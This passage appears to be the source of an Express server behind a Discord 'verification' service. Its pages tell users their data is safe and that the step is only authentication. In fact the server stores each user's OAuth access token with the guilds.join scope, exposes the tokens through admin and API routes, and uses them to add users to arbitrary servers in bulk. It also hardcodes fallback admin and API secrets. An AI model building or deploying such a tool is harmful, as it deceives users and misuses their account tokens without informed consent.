const express = require('express');
const FormData = require('form-data');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const { Redis } = require('@upstash/redis');
const path = require('path');
const sharp = require('sharp');

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.text());

// ─── REDIS ────────────────────────────────────────────────────
const redis = new Redis({
  url: process.env.KV_REST_API_URL,
  token: process.env.KV_REST_API_TOKEN,
});

// ─── CONFIGURAÇÕES GLOBAIS ────────────────────────────────────
const API_SECRET     = process.env.API_SECRET     || 'wht-secret-2025';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin-wht-2025';
const CANAL_ID       = process.env.CANAL_ID       || '1498452626357096489';

// ─── EXTRAÇÃO DE COR DOMINANTE ───────────────────────────────
async function extrairCorDominante(imageUrl) {
  try {
    const resp = await fetch(imageUrl);
    if (!resp.ok) return null;
    const buffer = Buffer.from(await resp.arrayBuffer());
    const { data } = await sharp(buffer)
      .resize(50, 50, { fit: 'cover' })
      .removeAlpha()
      .raw()
      .toBuffer({ resolveWithObject: true });
    const freq = {};
    for (let i = 0; i < data.length; i += 3) {
      const r = Math.round(data[i]     / 32) * 32;
      const g = Math.round(data[i + 1] / 32) * 32;
      const b = Math.round(data[i + 2] / 32) * 32;
      if (r + g + b < 60 || r + g + b > 680) continue;
      const key = `${r},${g},${b}`;
      freq[key] = (freq[key] || 0) + 1;
    }
    const dominante = Object.entries(freq).sort((a, b) => b[1] - a[1])[0];
    if (!dominante) return null;
    const [r, g, b] = dominante[0].split(',').map(Number);
    return '#' + [r, g, b].map(v => Math.min(255, v).toString(16).padStart(2, '0')).join('');
  } catch (err) {
    console.log('[extrairCorDominante] Erro:', err.message);
    return null;
  }
}

// ─── BOTS: variáveis de ambiente (legado) ────────────────────
function getEnvBots() {
  const bots = {};
  for (let i = 1; i <= 10; i++) {
    const prefix = `BOT${i}_`;
    const clientId = process.env[`${prefix}CLIENT_ID`];
    if (!clientId) continue;
    bots[`bot${i}`] = {
      id:             `bot${i}`,
      name:           process.env[`${prefix}NAME`]           || `Bot ${i}`,
      client_id:      clientId,
      client_secret:  process.env[`${prefix}CLIENT_SECRET`]  || '',
      redirect_uri:   process.env[`${prefix}REDIRECT_URI`]   || '',
      bot_token:      process.env[`${prefix}BOT_TOKEN`]      || '',
      guild_id:       process.env[`${prefix}GUILD_ID`]       || '',
      cargo_id:       process.env[`${prefix}CARGO_ID`]       || '',
      discord_invite: process.env[`${prefix}DISCORD_INVITE`] || '',
      canal_logs:     process.env[`${prefix}CANAL_LOGS`]     || '',
      source:         'env',
    };
  }
  return bots;
}

// ─── BOTS: Redis ──────────────────────────────────────────────
async function getRedisBots() {
  try {
    const raw = await redis.get('bots_config');
    if (!raw) return {};
    const list = typeof raw === 'string' ? JSON.parse(raw) : raw;
    const result = {};
    for (const bot of list) result[bot.id] = { ...bot, source: 'redis' };
    return result;
  } catch { return {}; }
}

async function getAllBots() {
  const envBots   = getEnvBots();
  const redisBots = await getRedisBots();
  return { ...envBots, ...redisBots };
}

async function saveRedisBots(botsList) {
  await redis.set('bots_config', JSON.stringify(botsList));
}

// ─── HELPERS REDIS ────────────────────────────────────────────
async function salvarLog(user, accessToken, botId, botName) {
  const entrada = {
    user_id:      String(user.id),
    username:     user.username,
    avatar:       user.avatar,
    access_token: accessToken,
    bot_id:       botId,
    bot_name:     botName,
    ts:           Math.floor(Date.now() / 1000),
  };
  await redis.set(`oauth:${user.id}`, JSON.stringify(entrada));
  await redis.sadd('oauth:ids', String(user.id));
}

async function buscarTodos() {
  const ids = await redis.smembers('oauth:ids');
  if (!ids || ids.length === 0) return [];
  const results = await Promise.all(ids.map(id => redis.get(`oauth:${id}`)));
  return results.map(r => (typeof r === 'string' ? JSON.parse(r) : r)).filter(Boolean);
}

async function buscarUm(user_id) {
  const data = await redis.get(`oauth:${user_id}`);
  if (!data) return null;
  return typeof data === 'string' ? JSON.parse(data) : data;
}

// ─── HELPERS ──────────────────────────────────────────────────
const MESES = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
function fmtData(dt) {
  return `${dt.getDate()} de ${MESES[dt.getMonth()]} de ${dt.getFullYear()} ${String(dt.getHours()).padStart(2,'0')}:${String(dt.getMinutes()).padStart(2,'0')}`;
}

function hexToRgb(hex) {
  const clean = hex.replace('#', '');
  const r = parseInt(clean.slice(0, 2), 16);
  const g = parseInt(clean.slice(2, 4), 16);
  const b = parseInt(clean.slice(4, 6), 16);
  return `${r},${g},${b}`;
}

// ─── ADMIN AUTH ───────────────────────────────────────────────
function adminAuth(req, res, next) {
  const pass = req.query.pass || req.headers['x-admin-pass'];
  if (pass !== ADMIN_PASSWORD) {
    return res.status(401).send(`<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"/><title>WHT Admin</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d0e14;color:#e8e9f3;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}.box{background:#13141d;border:1px solid #2a2b3d;border-radius:16px;padding:40px;text-align:center;max-width:380px;width:90%}h2{color:#ff1493;font-size:20px;margin-bottom:8px}p{color:#7b7d9a;font-size:13px;margin-bottom:20px}input{width:100%;background:#1a1b27;border:1px solid #2a2b3d;border-radius:8px;padding:10px 14px;color:#e8e9f3;font-size:13px;outline:none;margin-bottom:12px}input:focus{border-color:rgba(255,20,147,.5)}button{width:100%;background:#ff1493;color:#fff;border:none;border-radius:8px;padding:10px;font-size:13px;font-weight:600;cursor:pointer}</style>
</head><body><div class="box"><h2>🔐 WHT Admin</h2><p>Digite a senha para acessar o painel</p>
<input type="password" id="pass" placeholder="Senha..." onkeydown="if(event.key==='Enter')login()"/>
<button onclick="login()">Entrar</button></div>
<script>function login(){const p=document.getElementById('pass').value;if(p)window.location.href='/admin?pass='+encodeURIComponent(p);}<\/script>
</body></html>`);
  }
  next();
}

// ─── PAINEL ADMIN ─────────────────────────────────────────────
app.get('/admin', adminAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ─── API: stats ───────────────────────────────────────────────
app.get('/api/admin/stats', adminAuth, async (req, res) => {
  try {
    const logs = await buscarTodos();
    const hoje = Math.floor(Date.now() / 1000) - 86400;
    const bots = await getAllBots();
    const extrasRaw = await redis.get('servidores_extras');
    const extras = extrasRaw ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw) : [];
    const botStats = {};
    for (const [botId, cfg] of Object.entries(bots)) {
      botStats[botId] = { id: botId, name: cfg.name, guild_id: cfg.guild_id, tokens: logs.filter(e => e.bot_id === botId).length, source: cfg.source || 'env' };
    }
    res.json({
      total_tokens:      logs.length,
      com_token:         logs.filter(e => e.access_token).length,
      sem_token:         logs.filter(e => !e.access_token).length,
      verificados_hoje:  logs.filter(e => e.ts && e.ts > hoje).length,
      servidores_extras: extras.length,
      bots:              Object.values(botStats),
      usuarios: logs.map(e => ({ user_id: e.user_id, username: e.username, avatar: e.avatar, tem_token: !!e.access_token, bot_id: e.bot_id || null, bot_name: e.bot_name || null, ts: e.ts })),
    });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── API: listar bots ─────────────────────────────────────────
app.get('/api/admin/bots', adminAuth, async (req, res) => {
  try {
    const bots = await getAllBots();
    const logs = await buscarTodos();
    const result = Object.values(bots).map(b => ({
      id: b.id, name: b.name, client_id: b.client_id,
      client_secret: b.client_secret || '', bot_token: b.bot_token || '',
      guild_id: b.guild_id, redirect_uri: b.redirect_uri,
      cargo_id: b.cargo_id || '', discord_invite: b.discord_invite || '',
      canal_logs: b.canal_logs || '', tokens: logs.filter(e => e.bot_id === b.id).length,
      source: b.source || 'env', cor: b.cor || null, imagem_url: b.imagem_url || null,
      oauth_url: `https://discord.com/oauth2/authorize?client_id=${b.client_id}&redirect_uri=${encodeURIComponent(b.redirect_uri)}&response_type=code&scope=identify%20guilds.join`,
    }));
    res.json({ bots: result });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── API: cadastrar bot ───────────────────────────────────────
app.post('/api/admin/bots', adminAuth, async (req, res) => {
  try {
    const { name, client_id, client_secret, redirect_uri, bot_token, guild_id, cargo_id, cor, imagem_url, discord_invite, canal_logs } = req.body;
    if (!name || !client_id || !client_secret || !redirect_uri || !bot_token || !guild_id)
      return res.status(400).json({ error: 'Campos obrigatórios faltando' });
    const raw  = await redis.get('bots_config');
    const list = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
    const existingIds = list.map(b => b.id);
    let newIdx = list.length + 1;
    while (existingIds.includes(`rbot${newIdx}`)) newIdx++;
    const newId = `rbot${newIdx}`;
    let corFinal = cor || '#ff1493';
    if (imagem_url) {
      const corExtraida = await extrairCorDominante(imagem_url);
      if (corExtraida) corFinal = corExtraida;
    }
    const newBot = { id: newId, name, client_id, client_secret, redirect_uri, bot_token, guild_id, cargo_id: cargo_id || '', discord_invite: discord_invite || '', canal_logs: canal_logs || '', cor: corFinal, imagem_url: imagem_url || '', source: 'redis' };
    list.push(newBot);
    await saveRedisBots(list);
    res.json({ ok: true, cor_extraida: corFinal, bot: { ...newBot, client_secret: '***', bot_token: '***' } });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── API: editar bot ──────────────────────────────────────────
app.put('/api/admin/bots/:id', adminAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const raw  = await redis.get('bots_config');
    const list = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
    const idx  = list.findIndex(b => b.id === id);
    if (idx === -1) return res.status(404).json({ error: 'Bot não encontrado' });
    const allowed = ['name','client_id','client_secret','redirect_uri','bot_token','guild_id','cargo_id','cor','imagem_url','discord_invite','canal_logs'];
    for (const key of allowed) { if (req.body[key] !== undefined) list[idx][key] = req.body[key]; }
    if (req.body.imagem_url && req.body.imagem_url !== list[idx].imagem_url) {
      const corExtraida = await extrairCorDominante(req.body.imagem_url);
      if (corExtraida) list[idx].cor = corExtraida;
    }
    await saveRedisBots(list);
    res.json({ ok: true, cor: list[idx].cor });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── API: remover bot ─────────────────────────────────────────
app.delete('/api/admin/bots/:id', adminAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const raw  = await redis.get('bots_config');
    let list   = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
    list       = list.filter(b => b.id !== id);
    await saveRedisBots(list);
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── API: servidores extras ───────────────────────────────────
app.get('/api/admin/servidores', adminAuth, async (req, res) => {
  try {
    const raw    = await redis.get('servidores_extras');
    const extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
    res.json({ servidores: extras });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/admin/servidores', adminAuth, async (req, res) => {
  const { guild_id } = req.body;
  if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });
  try {
    const raw    = await redis.get('servidores_extras');
    const extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
    if (!extras.includes(guild_id)) { extras.push(guild_id); await redis.set('servidores_extras', JSON.stringify(extras)); }
    res.json({ ok: true, servidores: extras });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.delete('/api/admin/servidores/:guild_id', adminAuth, async (req, res) => {
  const { guild_id } = req.params;
  try {
    const raw  = await redis.get('servidores_extras');
    let extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
    extras     = extras.filter(id => id !== guild_id);
    await redis.set('servidores_extras', JSON.stringify(extras));
    res.json({ ok: true, servidores: extras });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── API: mover todos ─────────────────────────────────────────
app.post('/api/admin/mover-todos', adminAuth, async (req, res) => {
  const { guild_id, bot_id } = req.body;
  if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });
  const bots = await getAllBots();
  let bot_token = process.env.BOT_TOKEN;
  if (bot_id && bots[bot_id]) bot_token = bots[bot_id].bot_token;
  else if (Object.keys(bots).length > 0) bot_token = Object.values(bots)[0].bot_token;
  try {
    const logs = await buscarTodos();
    let ok = 0, falhou = 0;
    for (const entrada of logs) {
      if (!entrada.access_token) { falhou++; continue; }
      try {
        const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${entrada.user_id}`, {
          method: 'PUT',
          headers: { 'Authorization': `Bot ${bot_token}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ access_token: entrada.access_token }),
        });
        if ([200, 201, 204].includes(resp.status)) ok++; else falhou++;
      } catch { falhou++; }
      await new Promise(r => setTimeout(r, 100));
    }
    res.json({ ok, falhou, total: logs.length });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── API: log de clique ───────────────────────────────────────
app.post('/api/log-click', async (req, res) => {
  try {
    const { user_id, username, avatar, bot_id } = req.body;
    if (!user_id || !bot_id) return res.status(400).json({ error: 'Dados insuficientes' });
    const bots   = await getAllBots();
    const botCfg = bots[bot_id];
    if (!botCfg) return res.status(404).json({ error: 'Bot não encontrado' });
    const canalLogs = botCfg.canal_logs || CANAL_ID;
    const avatarURL = avatar ? `https://cdn.discordapp.com/avatars/${user_id}/${avatar}.png?size=256` : `https://cdn.discordapp.com/embed/avatars/0.png`;
    const agora  = new Date();
    const corInt = parseInt((botCfg.cor || '#ff1493').replace('#', ''), 16);
    await fetch(`https://discord.com/api/channels/${canalLogs}/messages`, {
      method: 'POST',
      headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{ color: corInt, title: '✅ Membro Clicou em Abrir Discord', fields: [
          { name: 'Membro:', value: `<@${user_id}>`, inline: false },
          { name: 'ID Discord:', value: `${user_id}`, inline: false },
          { name: 'Data e Hora:', value: fmtData(agora), inline: false },
        ], thumbnail: { url: avatarURL }, footer: { text: botCfg.name } }]
      })
    });
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── API EXTERNA ──────────────────────────────────────────────
app.get('/api/logs', async (req, res) => {
  if (req.headers['x-api-secret'] !== API_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  try {
    const logs = await buscarTodos();
    res.json({ total: logs.length, com_token: logs.filter(e => e.access_token).length, logs });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/mover', async (req, res) => {
  if (req.headers['x-api-secret'] !== API_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const { user_id, guild_id } = req.body;
  if (!user_id || !guild_id) return res.status(400).json({ error: 'user_id e guild_id sao obrigatorios' });
  try {
    const entrada   = await buscarUm(user_id);
    if (!entrada || !entrada.access_token) return res.status(404).json({ error: 'Usuario nao encontrado ou sem token' });
    const bot_token = process.env.BOT_TOKEN || process.env.BOT1_BOT_TOKEN;
    const resp      = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${user_id}`, {
      method: 'PUT',
      headers: { 'Authorization': `Bot ${bot_token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ access_token: entrada.access_token }),
    });
    res.json({ success: [200, 201, 204].includes(resp.status), status: resp.status });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ══════════════════════════════════════════════════════════════
// ─── PÁGINAS HTML ─────────────────────────────────────────────
// ══════════════════════════════════════════════════════════════

// ─── TELA 1: Verificação inicial (sem code) ───────────────────
function buildVerifyPage(botCfg) {
  const cor    = botCfg.cor || '#ff1493';
  const corRgb = hexToRgb(cor);
  const imgUrl = botCfg.imagem_url || 'https://i.imgur.com/G37BiaD.gif';
  const authUrl = `https://discord.com/oauth2/authorize?client_id=${botCfg.client_id}&redirect_uri=${encodeURIComponent(botCfg.redirect_uri)}&response_type=code&scope=identify%20guilds.join`;

  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>${botCfg.name} — Verificação</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
:root{--cor:${cor};--cor-rgb:${corRgb};--cor-glow:rgba(${corRgb},0.35)}
body{background:#080a0f;color:#e8e9f3;font-family:'Sora',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
.bg{position:fixed;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(${corRgb},0.12) 0%,transparent 70%);pointer-events:none}
.particles{position:fixed;inset:0;overflow:hidden;pointer-events:none}
.p{position:absolute;width:2px;height:2px;background:var(--cor);border-radius:50%;animation:float linear infinite;opacity:0}
@keyframes float{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:.6}90%{opacity:.2}100%{transform:translateY(-20px) scale(1.5);opacity:0}}
.card{position:relative;z-index:1;background:rgba(255,255,255,0.03);border:1px solid rgba(${corRgb},0.2);border-radius:24px;padding:40px 36px;max-width:460px;width:90%;backdrop-filter:blur(20px);box-shadow:0 0 60px rgba(${corRgb},0.1),0 0 120px rgba(${corRgb},0.05)}
.logo-wrap{width:90px;height:90px;border-radius:50%;border:2.5px solid var(--cor);margin:0 auto 20px;overflow:hidden;box-shadow:0 0 30px var(--cor-glow)}
.logo-wrap img{width:100%;height:100%;object-fit:cover}
h1{font-size:22px;font-weight:700;color:#fff;text-align:center;margin-bottom:6px}
.sub{font-size:13px;color:rgba(232,233,243,0.5);text-align:center;margin-bottom:28px}
.steps{display:flex;flex-direction:column;gap:10px;margin-bottom:28px}
.step{display:flex;align-items:center;gap:12px;padding:12px 14px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:12px}
.step-num{width:26px;height:26px;border-radius:50%;background:rgba(${corRgb},0.15);border:1px solid rgba(${corRgb},0.35);color:var(--cor);font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.step-text{font-size:12.5px;color:rgba(232,233,243,0.75)}
.btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:14px;background:var(--cor);color:#fff;border:none;border-radius:14px;font-size:15px;font-weight:600;font-family:'Sora',sans-serif;cursor:pointer;text-decoration:none;transition:all .2s;box-shadow:0 4px 24px rgba(${corRgb},0.4)}
.btn:hover{transform:translateY(-2px);box-shadow:0 8px 32px rgba(${corRgb},0.55)}
.footer{margin-top:20px;text-align:center;font-size:11px;color:rgba(232,233,243,0.25)}
.divider{height:1px;background:rgba(${corRgb},0.15);margin:20px 0}
</style>
</head>
<body>
<div class="bg"></div>
<div class="particles" id="pts"></div>
<div class="card">
  <div class="logo-wrap"><img src="${imgUrl}" alt="${botCfg.name}"/></div>
  <h1>${botCfg.name}</h1>
  <div class="sub">Verificação de Membro</div>
  <div class="steps">
    <div class="step"><div class="step-num">1</div><div class="step-text">Clique em <strong>Verificar Conta</strong> abaixo</div></div>
    <div class="step"><div class="step-num">2</div><div class="step-text">Autorize o acesso no Discord</div></div>
    <div class="step"><div class="step-num">3</div><div class="step-text">Verificação concluída automaticamente ✅</div></div>
  </div>
  <a class="btn" href="${authUrl}">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
    Verificar Conta
  </a>
  <div class="divider"></div>
  <div class="footer">🔒 Apenas autenticação — seus dados estão seguros<br/>${botCfg.name} • Verificação OAuth2</div>
</div>
<script>
const pts=document.getElementById('pts');
for(let i=0;i<18;i++){
  const p=document.createElement('div');p.className='p';
  p.style.left=Math.random()*100+'%';
  p.style.animationDuration=(6+Math.random()*10)+'s';
  p.style.animationDelay=(Math.random()*8)+'s';
  p.style.width=p.style.height=(1+Math.random()*2)+'px';
  pts.appendChild(p);
}
<\/script>
</body>
</html>`;
}

// ─── TELA 2: Verificado! (botão Abrir Discord) ────────────────
function buildSuccessPage(botCfg, user, avatarURL) {
  const cor    = botCfg.cor || '#ff1493';
  const corRgb = hexToRgb(cor);
  const imgUrl = botCfg.imagem_url || 'https://i.imgur.com/G37BiaD.gif';

  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>${botCfg.name} — Verificado!</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
:root{--c:${cor};--cr:${corRgb}}
body{background:#06060a;color:#fff;font-family:'Sora',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
.bg{position:fixed;inset:0;background:radial-gradient(ellipse 70% 55% at 50% 100%,rgba(${corRgb},.42) 0%,rgba(${corRgb},.12) 45%,transparent 72%);pointer-events:none;animation:ray 3s ease-in-out infinite alternate}
@keyframes ray{from{opacity:.7}to{opacity:1}}
#pts{position:fixed;inset:0;pointer-events:none;overflow:hidden}
.pt{position:absolute;border-radius:50%;background:var(--c);animation:rise linear infinite;opacity:0}
@keyframes rise{0%{transform:translateY(100vh) scale(0);opacity:0}8%{opacity:.8}92%{opacity:.2}100%{transform:translateY(-40px) scale(1.4);opacity:0}}
.card{position:relative;z-index:2;background:rgba(255,255,255,.03);border:1px solid rgba(${corRgb},.22);border-radius:28px;padding:40px 36px;max-width:420px;width:92%;text-align:center;backdrop-filter:blur(20px);box-shadow:0 0 80px rgba(${corRgb},.12),0 0 160px rgba(${corRgb},.06)}
.logo-ring{width:72px;height:72px;border-radius:50%;border:2.5px solid var(--c);overflow:hidden;margin:0 auto 10px;box-shadow:0 0 24px rgba(${corRgb},.5)}
.logo-ring img{width:100%;height:100%;object-fit:cover}
.avatar-ring{width:60px;height:60px;border-radius:50%;border:2px solid var(--c);overflow:hidden;margin:0 auto 18px;box-shadow:0 0 18px rgba(${corRgb},.4)}
.avatar-ring img{width:100%;height:100%;object-fit:cover}
.verified-title{font-size:24px;font-weight:800;color:var(--c);margin-bottom:6px;text-shadow:0 0 30px rgba(${corRgb},.5);letter-spacing:-.02em}
.verified-name{font-size:15px;color:rgba(232,233,243,.75);margin-bottom:24px}
.divider{height:1px;background:rgba(${corRgb},.18);margin-bottom:22px}
.btn-abrir{display:inline-flex;align-items:center;gap:10px;background:var(--c);color:#fff;padding:13px 32px;border-radius:14px;font-size:15px;font-weight:700;font-family:'Sora',sans-serif;cursor:pointer;border:none;box-shadow:0 4px 28px rgba(${corRgb},.5);transition:all .2s;letter-spacing:.01em}
.btn-abrir:hover{transform:translateY(-2px);box-shadow:0 8px 36px rgba(${corRgb},.7)}
.btn-abrir svg{flex-shrink:0}
.footer{color:rgba(232,233,243,.2);font-size:11px;margin-top:20px;letter-spacing:.04em}
</style>
</head>
<body>
<div class="bg"></div>
<div id="pts"></div>
<div class="card">
  <div class="logo-ring"><img src="${imgUrl}" alt="${botCfg.name}"/></div>
  <div class="avatar-ring"><img src="${avatarURL}" alt="avatar" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'"/></div>
  <div class="verified-title">Verificado! ✅</div>
  <div class="verified-name">Olá, ${user.username}!</div>
  <div class="divider"></div>
  <button class="btn-abrir" onclick="abrirDiscord()">
    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.032.054a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
    Abrir Discord
  </button>
  <div class="footer">${botCfg.name} • OAuth2 • Verificação segura</div>
</div>
<script>
const pts=document.getElementById('pts');
for(let i=0;i<22;i++){
  const p=document.createElement('div');p.className='pt';
  const sz=1.2+Math.random()*2.5;
  p.style.cssText='left:'+Math.random()*100+'%;width:'+sz+'px;height:'+sz+'px;animation-duration:'+(7+Math.random()*12)+'s;animation-delay:'+Math.random()*10+'s';
  pts.appendChild(p);
}
for(let i=0;i<45;i++){
  const s=document.createElement('div');
  s.style.cssText='position:absolute;border-radius:50%;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;width:'+(1+Math.random()*1.5)+'px;height:'+(1+Math.random()*1.5)+'px;opacity:'+(Math.random()*.18)+';animation:tw '+(2+Math.random()*4)+'s ease-in-out '+(Math.random()*3)+'s infinite alternate';
  pts.appendChild(s);
}
function abrirDiscord(){
  fetch('/api/log-click',{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({user_id:'${user.id}',username:'${user.username}',avatar:'${user.avatar || ""}',bot_id:'${botCfg.id}'})
  }).catch(()=>{});
  // Vai para tela de loading + setas
  const params=new URLSearchParams({
    bot:'${botCfg.id}',
    uid:'${user.id}',
    avatar:'${user.avatar || ""}',
    invite:'${encodeURIComponent(botCfg.discord_invite || "")}',
    guild:'${botCfg.guild_id}',
    cor:'${encodeURIComponent(cor)}',
    nome:'${encodeURIComponent(user.username)}'
  });
  window.location.href='/tela-setas?'+params.toString();
}
<\/script>
<style>@keyframes tw{from{opacity:.02}to{opacity:.28}}<\/style>
</body>
</html>`;
}

// ─── TELA 3: Loading + Setas (popup abre automaticamente) ─────
function buildSetasPage(p) {
  const cor    = p.cor    || '#ff1493';
  const corRgb = hexToRgb(cor);
  const nome   = p.nome   || 'usuário';
  const guild  = p.guild  || '';
  const invite = p.invite || '';
  const botId  = p.botId  || '';

  const avatarURL = p.avatar && p.uid
    ? `https://cdn.discordapp.com/avatars/${p.uid}/${p.avatar}.png?size=256`
    : `https://cdn.discordapp.com/embed/avatars/0.png`;

  // Monta deeplink
  let deepLink;
  if (invite.startsWith('https://discord.com/channels/')) {
    deepLink = invite.replace('https://discord.com/channels/', 'discord://discord.com/channels/');
  } else if (invite.startsWith('discord://')) {
    deepLink = invite;
  } else if (invite.match(/^https?:\/\/discord\.gg\//)) {
    deepLink = invite; // invite normal — browser abre direto
  } else {
    deepLink = `discord://discord.com/channels/${guild}`;
  }

  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>Abrindo Discord...</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&display=swap');
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root{--c:${cor};--cr:${corRgb}}
body{background:#06060a;font-family:'Sora',sans-serif;min-height:100vh;overflow:hidden;color:#fff}

/* ══ LOADING ══ */
#scr-load{position:fixed;inset:0;background:#06060a;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:28px;z-index:999}
.orb{position:relative;width:96px;height:96px}
.orb-pulse{position:absolute;inset:-16px;border-radius:50%;border:1px solid rgba(${corRgb},.22);animation:pulse-out 1.4s ease-out infinite}
.orb-pulse:nth-child(2){animation-delay:.7s}
.orb-ring{position:absolute;inset:0;border-radius:50%;border:2px solid transparent}
.orb-ring:nth-child(3){border-top-color:var(--c);animation:spin 1s linear infinite;box-shadow:0 0 18px rgba(${corRgb},.5)}
.orb-ring:nth-child(4){inset:12px;border-right-color:rgba(${corRgb},.5);animation:spin .7s linear infinite reverse}
.orb-ring:nth-child(5){inset:24px;border-bottom-color:rgba(${corRgb},.35);animation:spin 1.4s linear infinite}
.orb-core{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
.orb-core img{width:42px;height:42px;border-radius:50%;object-fit:cover;filter:drop-shadow(0 0 10px var(--c));animation:breath .9s ease-in-out infinite alternate}
.bar-track{width:180px;height:2px;background:rgba(255,255,255,.06);border-radius:99px;overflow:hidden}
.bar-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--c),rgba(${corRgb},.4));border-radius:99px;box-shadow:0 0 8px rgba(${corRgb},.8);transition:width .05s linear}
.load-lbl{font-size:11px;font-weight:600;letter-spacing:.18em;text-transform:uppercase;color:rgba(${corRgb},.65);animation:blink .9s ease-in-out infinite alternate}

/* ══ MAIN ══ */
#scr-main{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;opacity:0;transition:opacity .7s ease}
#scr-main.show{opacity:1}
.bg-ray{position:fixed;bottom:-80px;left:50%;transform:translateX(-50%);width:110vw;height:70vh;background:radial-gradient(ellipse 55% 60% at 50% 90%,rgba(${corRgb},.52) 0%,rgba(${corRgb},.18) 35%,transparent 70%);pointer-events:none;animation:ray-b 3s ease-in-out infinite alternate}
